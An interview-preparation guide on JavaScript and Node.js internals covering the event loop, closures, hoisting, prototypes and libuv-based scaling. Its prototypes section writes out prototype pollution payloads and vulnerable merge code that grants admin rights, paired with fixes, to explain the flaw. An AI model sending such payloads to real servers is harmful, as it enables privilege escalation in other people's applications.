# MERN Stack Senior Engineer Interview Guide

> **Principal Engineer · Technical Interview Series**
> Experience: 7+ years | Target: Senior → Staff → Architect
> Companies: Amazon · Google · Microsoft · Atlassian · Adobe · Uber · Airbnb · Salesforce · Walmart
> Questions: 18 / 60+ covered

---

## Topic 01 — JavaScript

---

### Q1 — Explain the JavaScript Event Loop

*Asked at: Amazon · Google · Uber · Microsoft*

#### Why Interviewers Ask This

This is a litmus test. If you cannot reason about the event loop, you cannot reason about async behavior, race conditions, UI jank, or why Node.js scales. Amazon and Google use this to filter candidates who only *use* JavaScript versus those who *understand* it.

#### Beginner Answer

> "JavaScript is single-threaded. The event loop picks tasks from a queue and executes them one at a time. setTimeout callbacks go into the queue and run after the current code finishes."

**Score: 3 / 10 — Correct but dangerously incomplete for a senior role**

#### Senior Engineer Answer

JavaScript has a **single call stack** and uses an **event loop** to achieve concurrency without threads. Here is the full mental model:

```text
┌─────────────────────────────────────────────────────────┐
│                     Call Stack                           │
│  [ main() → fetchUser() → processData() ]               │
└─────────────────────────────┬───────────────────────────┘
                              │ pops when empty
                              ▼
┌─────────────────────────────────────────────────────────┐
│                Event Loop (one tick)                     │
│  1. Run ALL microtasks  (Promise.then, queueMicrotask,   │
│                          MutationObserver)               │
│  2. Run ONE macrotask   (setTimeout, setInterval, I/O)   │
│  3. Render              (browser: style → layout → paint)│
│  4. Repeat                                               │
└─────────────────────────────────────────────────────────┘

Microtask Queue  [ p1.then  p2.then  MutationObserver ]  ← drained FULLY first
Macrotask Queue  [ setTimeout  setInterval  I/O cb ]     ← ONE per tick
```

**The priority order — what most seniors miss:**

```javascript
// Output order test — critical for interviews
console.log('1 - synchronous');

setTimeout(() => console.log('2 - macrotask'), 0);

Promise.resolve()
  .then(() => console.log('3 - microtask'))
  .then(() => console.log('4 - microtask chained'));

queueMicrotask(() => console.log('5 - queueMicrotask'));

console.log('6 - synchronous');

// Output: 1 → 6 → 3 → 5 → 4 → 2
```

> **Key Insight:** 3 fires before 5 before 4 because the microtask queue drains completely — including microtasks that *enqueue more microtasks* — before any macrotask runs.

**Node.js event loop phases** (different from the browser):

```text
┌──────────────────────────────────┐
│  timers           ← setTimeout, setInterval          │
│  pending callbacks← I/O errors deferred to next tick │
│  idle / prepare   ← internal use                     │
│  poll             ← retrieve I/O, execute callbacks  │
│  check            ← setImmediate                     │
│  close callbacks  ← socket.on('close')               │
└──────────────────────────────────┘
  ↑ process.nextTick() and Promise.then() run between EVERY phase
```

```javascript
// Node.js specific priority
setImmediate(() => console.log('setImmediate'));
setTimeout(() => console.log('setTimeout'), 0);
process.nextTick(() => console.log('nextTick'));
Promise.resolve().then(() => console.log('promise'));

// Output: nextTick → promise → setTimeout/setImmediate (order varies)
// nextTick has HIGHER priority than promise microtasks in Node
```

#### Trade-offs

| Approach | Advantage | Disadvantage |
|---|---|---|
| Single-threaded event loop | No race conditions, no mutex, simple mental model | Long sync tasks block everything — UI freezes, dropped requests |
| Microtasks for Promises | Predictable ordering, fast context switch | Microtask flood can starve macrotasks and the render cycle |
| Worker Threads (Node) | True parallelism for CPU-bound work | Shared memory complexity, message serialization cost |

#### Common Mistakes

**1. Starving the event loop with microtask recursion:**

```javascript
// DANGEROUS — infinite microtask loop, blocks the entire thread
function recurse() {
  Promise.resolve().then(recurse);
}
recurse();
```

**2. Assuming `setTimeout(fn, 0)` is instant:**

```javascript
// Minimum delay ~4ms in browsers
// Timer fires AFTER current microtasks drain
// React's scheduler uses MessageChannel, not setTimeout(fn, 0) — for this reason
```

**3. Confusing async/await with parallel execution:**

```javascript
// BAD — sequential, total time = fetchA + fetchB
async function bad() {
  const a = await fetchA();
  const b = await fetchB();
}

// GOOD — parallel, total time = max(fetchA, fetchB)
async function good() {
  const [a, b] = await Promise.all([fetchA(), fetchB()]);
}
```

**4. Not knowing `await` is microtask-based:**

```javascript
async function fn() {
  console.log('A');
  await Promise.resolve();
  console.log('B'); // B runs as a microtask continuation
}
fn();
console.log('C');
// Output: A → C → B
```

#### Follow-up Questions (expect these at FAANG)

1. What happens if you have 1000 `Promise.resolve().then()` chained — does it block rendering?
2. How does React's Concurrent Mode use the scheduler to yield to the browser between renders? *(answer: MessageChannel + 5ms time slices)*
3. What is `queueMicrotask` and when would you use it over `Promise.resolve().then()`?
4. How does `async/await` desugar under the hood into generators and Promises?
5. How does Node.js `process.nextTick` differ from `setImmediate` and when does order matter?

#### Real Production Example

At Uber-scale, a Node.js API gateway was dropping ~2% of requests during traffic spikes. Root cause: a logging middleware was doing a synchronous `JSON.stringify` of large request payloads on every request. This 3ms sync operation, multiplied across high QPS, was blocking the event loop long enough for health check timeouts to fire.

```javascript
// BAD — blocks event loop on every request
app.use((req, res, next) => {
  fs.writeFileSync('./log.txt', JSON.stringify(req.body)); // BLOCKS
  next();
});

// GOOD — deferred, non-blocking
app.use((req, res, next) => {
  setImmediate(() => logger.info(req.body)); // yields to event loop first
  next();
});
```

**Fix applied:** Moved serialization to a Worker Thread, sampled logs at 10% under load, switched to `pino` (defers serialization asynchronously). Request drop rate fell to 0%.

#### Performance Considerations

- Use `--inspect` + Chrome DevTools **Performance** tab to visualize event loop lag as flame charts
- Node.js `perf_hooks.monitorEventLoopDelay()` — alert when p99 > 10ms
- `clinic.js` (NearForm) for Node event loop profiling in production
- Target: event loop lag < 5ms for interactive APIs

#### Scalability Considerations

- **CPU-bound work** → Worker Threads (Node 12+) or child processes — never block the main loop
- **Heavy I/O** → Event loop handles natively; just don't mix in sync operations
- **Multi-core** → Cluster mode (one process per CPU core); each has its own isolated event loop
- **libuv thread pool** — default size 4, handles `fs`, `crypto`, `dns`; increase with `UV_THREADPOOL_SIZE=16` for I/O-heavy workloads

> **Interviewer Note:** A candidate who covers microtask vs macrotask priority, Node's phase-based loop, and can describe a real production event loop diagnosis is operating at Staff Engineer level.

---

### Q2 — Explain Closures — How They Work, Where They're Used, and Where They Bite You

*Asked at: Microsoft · Atlassian · Airbnb · Salesforce*

#### Why Interviewers Ask This

Closures are the foundation of React hooks, module patterns, memoization, currying, and partial application. If you cannot explain closure memory implications you will introduce leaks in production. Microsoft and Atlassian use this to determine whether a candidate uses closures or genuinely understands them.

#### Beginner Answer

> "A closure is when an inner function remembers variables from its outer function even after the outer function has returned."

**Score: 3 / 10 — Technically correct, no depth, no production relevance**

#### Senior Engineer Answer

A closure is the combination of **a function** and its **lexical environment** — the scope chain at the time of *definition*, not execution. Every function in JavaScript is a closure by default.

```javascript
function outer() {
  let count = 0;  // lives in outer's scope

  return function inner() {  // inner closes over count
    count++;
    return count;
  };
}

const increment = outer();   // outer() finishes — count would normally be GC'd
console.log(increment());     // 1 — but it's NOT GC'd; inner holds a reference
console.log(increment());     // 2
console.log(increment());     // 3
```

**What's happening in memory:**

```text
Heap:
┌────────────────────────────────────────────────────────┐
│  Closure Object (inner function)                        │
│  ┌──────────────────────────────────────────────────┐  │
│  │  [[Environment]] → { count: 3 }   ← NOT GC'd    │  │
│  │  [[Code]]        → function body                │  │
│  └──────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────┘
```

**The classic loop bug — asked at every FAANG interview:**

```javascript
// BUG — var is function-scoped, not block-scoped
for (var i = 0; i < 5; i++) {
  setTimeout(() => console.log(i), 1000);
}
// Prints: 5 5 5 5 5
// All callbacks close over the SAME i, which is 5 by the time they run

// FIX 1 — let creates a new binding per iteration
for (let i = 0; i < 5; i++) {
  setTimeout(() => console.log(i), 1000);
}
// Prints: 0 1 2 3 4 ✓

// FIX 2 — IIFE creates a new scope per iteration (pre-ES6 approach)
for (var i = 0; i < 5; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 1000);
  })(i);
}
// Prints: 0 1 2 3 4 ✓
```

> **Why let works:** The ES spec mandates a *new binding* of `i` for each iteration — it is as if each loop body runs with its own separate `i` variable captured independently.

**The stale closure problem in React — asked at Airbnb/Uber:**

```javascript
// BUG — stale closure, count never increments past 1
function Counter() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      setCount(count + 1);  // closes over count = 0 at render time, forever
    }, 1000);
    return () => clearInterval(id);
  }, []);   // empty deps — closure is stale forever
}

// FIX 1 — functional update, no stale read
setCount(prev => prev + 1);   // ✓ always has latest value

// FIX 2 — useRef holds latest value without re-triggering effect
const countRef = useRef(count);
useEffect(() => { countRef.current = count; });

useEffect(() => {
  const id = setInterval(() => {
    setCount(countRef.current + 1);  // ✓ always reads latest
  }, 1000);
  return () => clearInterval(id);
}, []);
```

**Memoization via closures (used in lodash, React useMemo internals):**

```javascript
function memoize(fn) {
  const cache = new Map();  // closed over — survives between calls

  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

const expensiveCalc = memoize((n) => n * n);
expensiveCalc(5);  // computed
expensiveCalc(5);  // cache hit — O(1)
```

#### Trade-offs

| Pattern | Advantage | Disadvantage |
|---|---|---|
| Closure for private state | True encapsulation without classes | Each instance creates new function objects on the heap |
| Memoization via closure | Massive perf win for pure functions | Cache never expires → potential unbounded memory leak |
| Stale closures in React | Simple mental model for effects | Silent bugs — stale reads with no error thrown, hard to debug |
| Module pattern | Works pre-ES6, true privacy | Replaced by ES Modules + WeakMap for modern codebases |

#### Common Mistakes

**1. Holding large objects in closure scope — memory leak:**

```javascript
// LEAK — entire 8MB array kept alive by closure
function processData() {
  const hugeArray = new Array(1_000_000).fill('data');

  return function getValue() {
    return hugeArray[0];  // only needs [0] but holds 1M items alive
  };
}

// FIX — extract only what you need, let the rest be GC'd
function processData() {
  const hugeArray = new Array(1_000_000).fill('data');
  const needed = hugeArray[0];  // extract
  // hugeArray is now eligible for GC after processData returns

  return function getValue() {
    return needed;
  };
}
```

**2. Thinking closures copy values — they capture references:**

```javascript
let x = 10;
const fn = () => console.log(x);
x = 20;
fn();  // 20, not 10 — closure captures REFERENCE to binding, not value
```

**3. Accidental closure in event listeners (classic leak):**

```javascript
class Component {
  init() {
    const self = this;  // entire component instance captured
    document.addEventListener('click', function handler() {
      console.log(self.data);
    });
    // Without removeEventListener on unmount → handler + self = leak
  }
}
```

#### Follow-up Questions

1. How does V8 optimize closures — does it always allocate scope on the heap? *(V8 escape analysis: if a variable doesn't escape, it stays on the stack)*
2. How would you implement a `once()` function using closures?
3. What is a closure's `[[Environment]]` internal slot and how does the scope chain walk work?
4. How do closures interact with `this` — and why do arrow functions behave differently?
5. Explain how `useCallback` uses closures and when it helps vs hurts performance.

#### Real Production Example

At Walmart-scale checkout, a React product listing page was leaking ~50MB of memory per session. A `useEffect` with `[]` deps closed over the initial `productList` (5000 items). A WebSocket handler registered inside never received updated prices AND the 5000-item array was never GC'd because the closure held a live reference.

```javascript
// LEAKED — 5000-item array never GC'd, stale prices forever
useEffect(() => {
  socket.on('price-update', (update) => {
    const product = productList.find(p => p.id === update.id);  // stale + leak
    updatePrice(product, update.price);
  });
}, []);

// FIXED — useRef holds latest list without closing over stale value
const productListRef = useRef(productList);
useEffect(() => { productListRef.current = productList; });

useEffect(() => {
  socket.on('price-update', (update) => {
    const product = productListRef.current.find(p => p.id === update.id);  // ✓
    updatePrice(product, update.price);
  });
  return () => socket.off('price-update');
}, []);
```

#### Performance Considerations

- V8 performs **escape analysis** — if a closed-over variable doesn't escape its function, it stays on the stack (fast), not the heap
- Closures inside tight loops create GC pressure — move function definitions outside loops
- Use `WeakMap` instead of `Map` for closure-based caches when keys are objects — allows GC when keys go out of scope
- Chrome DevTools → Memory → Heap Snapshot → filter "closure" to identify leaks

#### Scalability Considerations

- In Node.js request handlers: closures per-request that capture large objects = memory grows linearly with RPS
- Pattern: extract shared logic *outside* the request handler — only per-request state lives inside the closure
- At 10k+ RPS, even a 1KB unexpected closure retention = 10MB/s leak rate — monitor heap growth continuously in production

> **Interviewer Note:** A candidate who covers stale closures in React, the loop bug root cause (var binding semantics vs let), and a real memory leak investigation is operating at Senior/Staff level. Bonus: mentions V8 escape analysis — that is Principal-level depth.

---

### Q3 — Explain Hoisting — var vs let/const, the Temporal Dead Zone, and Function Declaration vs Expression

*Asked at: Google · Adobe · Walmart · Atlassian*

#### Why Interviewers Ask This

Most developers know hoisting exists. Interviewers ask this to find out if you understand *why* it exists — the two-phase JS execution model — and whether you know the Temporal Dead Zone. Candidates who confuse "hoisted but not initialized" with "not hoisted" reveal that they memorized a rule without understanding the mechanism. Adobe and Atlassian use this to verify you can explain subtle runtime bugs to junior developers.

#### Beginner Answer

> "JavaScript moves variable declarations to the top of their scope before executing the code. So you can use a var variable before you declare it."

**Score: 3 / 10 — Misses TDZ, the compilation model, and function vs expression hoisting entirely**

#### Senior Engineer Answer

Hoisting is not about the engine *moving* code. It is the result of the JS engine running in **two phases**:

```text
Phase 1 — Compilation (binding creation)
  Engine scans the scope, finds all declarations (var, let, const, function, class)
  and creates bindings in the environment record BEFORE any code executes.

  var x      → binding created, initialized to undefined  ← available immediately
  let y      → binding created, NOT initialized            ← Temporal Dead Zone
  const z    → binding created, NOT initialized            ← Temporal Dead Zone
  function f → binding created, initialized to full body  ← fully available
  class C    → binding created, NOT initialized            ← Temporal Dead Zone

Phase 2 — Execution
  Code runs line by line. TDZ bindings become initialized when their
  declaration line is reached.
```

**var — declaration hoisted, value is undefined:**

```javascript
console.log(x);  // undefined — NOT ReferenceError
var x = 5;
console.log(x);  // 5

// What the engine sees after phase 1:
var x;            // hoisted, initialized to undefined
console.log(x);  // undefined
x = 5;
console.log(x);  // 5
```

**let / const — hoisted but in Temporal Dead Zone:**

```javascript
console.log(y);  // ReferenceError: Cannot access 'y' before initialization
let y = 10;

// TDZ = the zone between the start of the block and the let/const line
// The binding EXISTS in memory — but reading it throws

{
  // ← TDZ for z starts here
  console.log(z);  // ReferenceError
  let z = 42;      // ← TDZ ends here, z is now initialized
  console.log(z);  // 42
}
```

**Function declaration vs function expression — the critical difference:**

```javascript
// Function DECLARATION — fully hoisted (body included)
greet();  // "Hello" — works fine before declaration
function greet() { console.log('Hello'); }

// Function EXPRESSION — only the var is hoisted, not the function
sayBye();  // TypeError: sayBye is not a function
var sayBye = function() { console.log('Bye'); };

// Arrow function assigned to let — TDZ ReferenceError
sayHi();   // ReferenceError: Cannot access 'sayHi' before initialization
const sayHi = () => console.log('Hi');
```

**Class declarations follow let/const rules — they are in TDZ:**

```javascript
const user = new User();  // ReferenceError — class is in TDZ
class User { }

// This is intentional — class bodies run in strict mode
// and forward-referencing a class is almost always a design mistake
```

**The typeof trap — typeof is no longer a safe guard:**

```javascript
// Pre-ES6: typeof was always safe, even for undeclared variables
console.log(typeof undeclaredVar);  // "undefined" — safe

// Post-ES6: typeof THROWS for variables in TDZ
console.log(typeof myLetVar);       // ReferenceError — TDZ!
let myLetVar = 5;

// This breaks the classic "feature detection" pattern:
// if (typeof someVar !== 'undefined') { ... }  ← unsafe with let/const
```

**Hoisting in switch cases — a subtle trap:**

```javascript
switch (x) {
  case 1:
    let result = 'one';  // scoped to the entire switch block, not just case 1
    break;
  case 2:
    console.log(result);  // ReferenceError in TDZ even though case 1 declared it
    break;
}

// Fix: wrap each case in its own block scope
switch (x) {
  case 1: {
    let result = 'one';  // scoped to this block only
    break;
  }
  case 2: {
    let result = 'two';  // independent binding
    break;
  }
}
```

#### Trade-offs

| Behavior | Advantage | Disadvantage |
|---|---|---|
| var hoisting to undefined | Never throws — legacy code runs without crashing | Silent undefined bugs are hard to trace; var leaks out of blocks |
| TDZ for let / const | Fails loudly — catches use-before-declare bugs at the exact line | Runtime ReferenceError rather than compile-time; typeof breaks |
| Function declaration hoisting | Enables mutual recursion; top-down code organization | Easy to accidentally rely on it; obscures the call-order dependency |
| Class TDZ | Forces classes to be declared before use — good discipline | Can surprise devs who assume classes behave like function declarations |

#### Common Mistakes

**1. Thinking let/const are not hoisted at all:**

```javascript
let x = 'outer';
{
  console.log(x);  // ReferenceError — NOT 'outer'
  let x = 'inner';
}
// If let were NOT hoisted, this would print 'outer' (from the outer scope)
// The ReferenceError proves the inner let IS hoisted — it creates a new
// binding in this block that shadows outer x, but starts in TDZ
```

**2. Replacing function declaration with arrow function — breaks callers above it:**

```javascript
// Before refactor — works because function declaration is fully hoisted
init();
function init() { console.log('ready'); }

// After refactor — breaks silently if caller is above declaration
init();  // ReferenceError — const is in TDZ
const init = () => console.log('ready');
```

**3. var inside a block leaking out:**

```javascript
if (true) {
  var leaked = 'I escape the block';
  let contained = 'I stay here';
}
console.log(leaked);     // 'I escape the block' — var is function-scoped
console.log(contained);  // ReferenceError — let is block-scoped
```

#### Follow-up Questions

1. Prove that `let` is hoisted — without causing a ReferenceError. *(trick: the shadow example above proves it)*
2. What is the environment record and how does the JS engine implement TDZ internally?
3. How does hoisting interact with closures in a loop — and why does `var` give the closure bug?
4. Does `const` allow any form of mutation? *(yes — object properties; no — rebinding)*
5. How does TypeScript's type system interact with TDZ — does it catch use-before-declare at compile time?

#### Real Production Example

At an Adobe-scale SPA, a team refactored all utility functions from function declarations to arrow function constants for consistency with the ESLint style guide. Six months later, a bug was reported: the app crashed on cold load in production but worked fine in development.

Root cause: the Webpack production bundle reordered module initialization. One utility module called `formatCurrency()` at the top level before the arrow function was initialized. In development, a different bundle chunk order happened to work. After the refactor, `formatCurrency` was a `const` in TDZ at call time.

```javascript
// utils/currency.js — AFTER refactor (broke prod)
export const formatCurrency = (val) => `$${val.toFixed(2)}`;

// init.js — calls it at module level, which runs before currency.js initializes in prod bundle
import { formatCurrency } from './utils/currency';
const DEFAULT_DISPLAY = formatCurrency(0);  // ReferenceError in prod only

// Fix 1: lazy initialization — defer the call
let DEFAULT_DISPLAY;
export function getDefaultDisplay() {
  return DEFAULT_DISPLAY ?? (DEFAULT_DISPLAY = formatCurrency(0));
}

// Fix 2: keep utility as function declaration to restore hoisting guarantees
export function formatCurrency(val) { return `$${val.toFixed(2)}`; }
```

#### Performance Considerations

- `const` allows V8 to apply more aggressive optimizations — the engine knows the binding will never be reassigned, enabling tighter register allocation
- Function declarations are parsed eagerly in phase 1 — at high module counts this slightly increases parse time vs lazy function expressions
- TDZ checks add a small runtime cost per access in unoptimized code — V8 eliminates them after JIT warmup when the pattern is clear

#### Scalability Considerations

- In large codebases with many modules: **circular dependencies + hoisting = initialization order bugs** that only appear in specific bundle sequences — use `eslint-plugin-import/no-cycle` to detect these
- Enforce `no-use-before-define` ESLint rule — catches TDZ violations at lint time rather than runtime
- In Node.js ESM (`import`): bindings are live — a module that imports a value reads the current binding state at call time, not a snapshot — this interacts with hoisting in surprising ways during circular imports

> **Interviewer Note:** A candidate who explains TDZ by proving let IS hoisted (the shadow example), and can describe a bundle-order initialization bug, is at Senior level. A candidate who also explains V8's environment record implementation and ESM live binding semantics is at Staff/Principal level.

---

### Q4 — Explain Prototypes — the Chain, Object.create, class Sugar, and Prototype Pollution

*Asked at: Google · Airbnb · Uber · Salesforce*

#### Why Interviewers Ask This

JavaScript's inheritance model is prototype-based — not class-based. The `class` keyword is syntactic sugar introduced in ES6 that does not change the underlying model. Interviewers at Google and Airbnb use this question to verify you understand what is actually happening at runtime versus what the syntax implies, and whether you are aware of the prototype pollution security vulnerability that affects real Node.js applications.

#### Beginner Answer

> "JavaScript uses prototypes for inheritance. Every object has a prototype that it can inherit properties and methods from."

**Score: 3 / 10 — Correct at surface level, no chain mechanics, no prototype vs __proto__ distinction, no security awareness**

#### Senior Engineer Answer

Every JavaScript object has an internal `[[Prototype]]` slot — a reference to another object (or `null`). Property lookup walks this chain until the property is found or the chain ends at `null`.

```text
Property lookup: obj.toString()

obj  ──[[Prototype]]──▶  Object.prototype  ──[[Prototype]]──▶  null
 ↑                            ↑
 { name: 'Alice' }       { toString, hasOwnProperty, ... }

1. Does obj have own property 'toString'?  No
2. Does Object.prototype have 'toString'?  Yes → use it
3. If null is reached without finding it → undefined
```

**The `prototype` vs `__proto__` confusion — most common interview trap:**

```javascript
// prototype   → property on FUNCTIONS. It's the object assigned as
//               [[Prototype]] of instances created with new
// __proto__   → accessor on OBJECTS. Exposes the [[Prototype]] slot
// Object.getPrototypeOf() → the correct modern API

function Dog(name) { this.name = name; }
Dog.prototype.bark = function() { return 'Woof!'; };

const rex = new Dog('Rex');

console.log(rex.__proto__ === Dog.prototype);           // true
console.log(Object.getPrototypeOf(rex) === Dog.prototype); // true (preferred)
console.log(rex.hasOwnProperty('name'));               // true  — own property
console.log(rex.hasOwnProperty('bark'));               // false — on prototype
console.log('bark' in rex);                           // true  — in operator walks chain
```

**What `new` actually does — four steps:**

```javascript
// new Dog('Rex') is roughly equivalent to:
function myNew(Constructor, ...args) {
  // 1. Create a plain object
  const obj = {};
  // 2. Set its [[Prototype]] to Constructor.prototype
  Object.setPrototypeOf(obj, Constructor.prototype);
  // 3. Call the constructor with obj as 'this'
  const result = Constructor.apply(obj, args);
  // 4. Return the object (or the constructor's return value if it's an object)
  return result instanceof Object ? result : obj;
}
```

**`Object.create` — explicit prototype assignment:**

```javascript
const animalProto = {
  breathe() { return `${this.name} breathes`; }
};

const dog = Object.create(animalProto);  // [[Prototype]] = animalProto
dog.name = 'Rex';
dog.bark = function() { return 'Woof!'; };

console.log(dog.breathe());  // 'Rex breathes' — found on prototype

// Object.create(null) — no prototype at all, safe hashmap
const safeMap = Object.create(null);
safeMap.key = 'value';
// safeMap has no toString, no hasOwnProperty, no __proto__ — clean
```

**class is sugar — revealing what it compiles to:**

```javascript
// ES6 class syntax
class Animal {
  constructor(name) { this.name = name; }
  speak() { return `${this.name} makes a sound`; }
}

class Dog extends Animal {
  speak() { return `${this.name} barks`; }
}

// What this creates in memory (roughly):
Dog.prototype.__proto__ === Animal.prototype   // true — extends wires this up
Dog.__proto__ === Animal                       // true — static inheritance too

// Proving class is just syntax:
const rex = new Dog('Rex');
console.log(Object.getPrototypeOf(Object.getPrototypeOf(rex)) === Animal.prototype);
// true — rex → Dog.prototype → Animal.prototype → Object.prototype → null
```

**`instanceof` — how it works and when it lies:**

```javascript
// instanceof walks the [[Prototype]] chain looking for Constructor.prototype
rex instanceof Dog;     // true  — Dog.prototype is in rex's chain
rex instanceof Animal;  // true  — Animal.prototype is also in the chain

// instanceof LIES across realms (iframe, vm.runInNewContext, worker)
// Each realm has its own Array, Object, etc.
const arr = new iframeWindow.Array();
arr instanceof Array;  // false! — different Array.prototype across realms
Array.isArray(arr);    // true  — isArray uses [[Class]] internal slot, realm-safe

// instanceof can be spoofed via Symbol.hasInstance
class Even {
  static [Symbol.hasInstance](num) { return num % 2 === 0; }
}
4 instanceof Even;   // true  — not a real instance
5 instanceof Even;   // false
```

**Prototype pollution — the security vulnerability:**

```javascript
// An attacker sends this JSON payload to any deep-merge endpoint:
// { "__proto__": { "isAdmin": true } }

function merge(target, source) {
  for (const key in source) {
    target[key] = source[key];  // BUG: key = '__proto__', target = Object.prototype
  }
}

const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
merge({}, payload);

// NOW: every plain object in the entire process has isAdmin = true
console.log({}.isAdmin);  // true — ALL objects polluted

// Fix 1: check key before assigning
function safeMerge(target, source) {
  for (const key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    if (Object.prototype.hasOwnProperty.call(source, key)) {
      target[key] = source[key];
    }
  }
}

// Fix 2: use Object.create(null) as the merge target
// Fix 3: use structuredClone() or JSON.parse(JSON.stringify()) for deep cloning
```

#### Trade-offs

| Pattern | Advantage | Disadvantage |
|---|---|---|
| class syntax | Readable, familiar to OOP developers, enforces new in strict mode | Hides prototype model, can mislead devs into thinking it's classical OOP |
| Object.create(proto) | Explicit, composable, no constructor required | Verbose, less familiar to most teams, no super keyword |
| Object.create(null) | True safe hashmap, immune to prototype pollution | No inherited methods — cannot call .toString(), .hasOwnProperty() etc. |
| Deep prototype chain | Powerful inheritance reuse | V8 property lookup slows past 3–4 levels; prefer composition |

#### Common Mistakes

**1. Confusing `prototype` (on functions) with `__proto__` (on objects):**

```javascript
function Foo() {}
const f = new Foo();

// prototype → only on functions, used during construction
console.log(Foo.prototype);         // { constructor: Foo }
// __proto__ → on instances, points to the constructor's prototype
console.log(f.__proto__);           // { constructor: Foo } — same object
// Arrow functions have NO prototype property
const arrow = () => {};
console.log(arrow.prototype);       // undefined — cannot be used with new
```

**2. Mutating built-in prototypes — never do this in production:**

```javascript
// Old jQuery-era anti-pattern — breaks third-party code and future JS features
Array.prototype.last = function() { return this[this.length - 1]; };
// ES2023 added Array.prototype.at(-1) — now you have a naming collision
```

**3. Using `for...in` over objects without checking `hasOwnProperty`:**

```javascript
const obj = { a: 1, b: 2 };
for (const key in obj) {
  // BUG: also iterates over inherited enumerable properties
  console.log(key, obj[key]);
}

// Fix: use for...of with Object.keys() — own enumerable only
for (const key of Object.keys(obj)) {
  console.log(key, obj[key]);  // own properties only ✓
}
```

#### Follow-up Questions

1. What is the full prototype chain of an array? *(`arr → Array.prototype → Object.prototype → null`)*
2. How do mixins work with prototypes — implement a simple mixin pattern.
3. What does `Object.create(null)` give you and when would you use it over `Map`?
4. How does `super` work under the hood — what is `[[HomeObject]]`?
5. Explain prototype pollution CVE-2019-10744 in lodash and how it was patched.

#### Real Production Example

CVE-2019-10744 — lodash versions below 4.17.12 had a prototype pollution vulnerability in `_.defaultsDeep`, `_.merge`, and `_.mergeWith`. An attacker could send a crafted JSON body to any Express endpoint that called one of these functions, injecting arbitrary properties onto `Object.prototype` that would then appear on every plain object in the Node process.

```javascript
// Attack: POST /api/update with body:
// { "constructor": { "prototype": { "isAdmin": true } } }

// Vulnerable server code (lodash < 4.17.12)
app.post('/api/update', (req, res) => {
  const config = _.merge({}, req.body);  // pollutes Object.prototype
  // Now: ({}).isAdmin === true for the entire process lifetime
  if (user.isAdmin) { /* attacker is now admin */ }
});

// Lodash fix: check for dangerous keys during recursive merge
// Your fix: validate and sanitize input before any deep merge
// Best fix: use Map instead of plain objects for arbitrary key storage
const safeStore = new Map();  // Map has no prototype chain to pollute
```

#### Performance Considerations

- **V8 hidden classes (Shapes):** V8 creates an internal "shape" for each unique property structure. Adding properties in a consistent order across instances allows V8 to share the shape — critical for performance. Prototype lookup is fast when V8 can inline-cache it.
- **Chain length:** each level in the prototype chain adds a lookup. Keep chains under 3–4 levels; prefer composition over deep inheritance
- **`Object.create(null)` for hashmaps:** avoids the `Object.prototype` chain lookup — measurably faster for hot-path key lookups on large maps
- **Delete property:** using `delete obj.key` changes the hidden class and forces V8 to deoptimize — set to `undefined` or use `Map` instead

#### Scalability Considerations

- **Prototype pollution is process-wide** — in a Node.js API serving thousands of RPS, one successful attack affects every subsequent request in that process instance until restart
- Run Node with `--frozen-intrinsics` flag (experimental) to prevent modification of built-in prototypes entirely
- Use `Map` over plain objects for any user-controlled key storage — Maps are not prototype-pollutable
- In microservices: process isolation (one service per process/container) limits the blast radius of a prototype pollution exploit

> **Interviewer Note:** A candidate who explains the `prototype` vs `__proto__` distinction, reveals what `class` compiles to, and knows the lodash CVE with a concrete mitigation is at Senior level. Explaining V8 hidden classes and `[[HomeObject]]` for `super` is Staff/Principal territory.

---

## Topic 02 — Node.js

---

### Q19 — Node.js Architecture: Event-Driven Core, libuv, and Scaling Patterns

*Asked at: Amazon · Microsoft · Uber · Walmart*

#### Why Interviewers Ask This

Anyone can `app.listen(3000)`. This question separates candidates who used Node.js from candidates who can explain *why* it scales the way it does, and who can design an architecture that survives a CPU-bound spike or a 10x traffic surge. Amazon and Walmart-scale interviews use this to probe both runtime internals and application-layer architecture in one question.

#### Beginner Answer

> "Node.js is single-threaded and non-blocking, so it can handle many requests at once without creating a thread per request like traditional servers."

**Score: 3 / 10 — True, but says nothing about libuv, the thread pool, or how to actually scale a Node app**

#### Senior Engineer Answer

Node.js is not "single-threaded" in the way people assume — it has **one JS execution thread**, but the runtime itself uses multiple threads under the hood via **libuv**.

```text
┌─────────────────────────────────────────────────────────────┐
│                        Your Application                      │
│              (routes, controllers, services)                 │
├─────────────────────────────────────────────────────────────┤
│   Node.js Bindings (fs, net, http, crypto, dns, ...)         │
├─────────────────────────────────────────────────────────────┤
│   V8 Engine            │            libuv                    │
│   - JS execution       │   - Event loop (single thread)      │
│   - Heap / GC          │   - Thread pool (default 4 threads) │
│   - JIT compilation    │   - OS async I/O (epoll/kqueue/IOCP) │
└─────────────────────────────────────────────────────────────┘
```

**What actually uses the libuv thread pool vs. OS-level async I/O:**

```text
Thread pool (UV_THREADPOOL_SIZE, default 4):
  - fs.* (file system — no native async I/O on all platforms)
  - crypto.pbkdf2 / scrypt / randomBytes (CPU-heavy)
  - zlib (compression)
  - dns.lookup (uses getaddrinfo, NOT dns.resolve which is a direct socket call)

OS-level async I/O (no thread pool needed — epoll/kqueue/IOCP):
  - net / http / tcp sockets
  - dns.resolve*
```

> **Interview trap:** "Is Node single-threaded?" — The correct answer is "the event loop and your JS run on one thread, but libuv uses a thread pool for certain blocking syscalls, and V8's garbage collector also has helper threads."

**Scaling out — three mechanisms, very different trade-offs:**

```javascript
// 1. Cluster module — multi-PROCESS, shares a port, separate V8 heaps
const cluster = require('cluster');
const os = require('os');

if (cluster.isPrimary) {
  os.cpus().forEach(() => cluster.fork());  // one process per core
  cluster.on('exit', (worker) => cluster.fork()); // respawn on crash
} else {
  require('./server'); // each worker runs the full app
}

// 2. Worker Threads — multi-THREAD, shares memory via SharedArrayBuffer
const { Worker } = require('worker_threads');
const worker = new Worker('./cpu-heavy-task.js', { workerData: largeBuffer });
worker.on('message', (result) => console.log(result));
// Use for: image processing, PDF generation, heavy computation — NOT for I/O

// 3. Child Process — separate program entirely, IPC via serialization
const { spawn } = require('child_process');
const proc = spawn('ffmpeg', ['-i', 'input.mp4', 'output.mp4']);
// Use for: shelling out to other binaries/languages
```

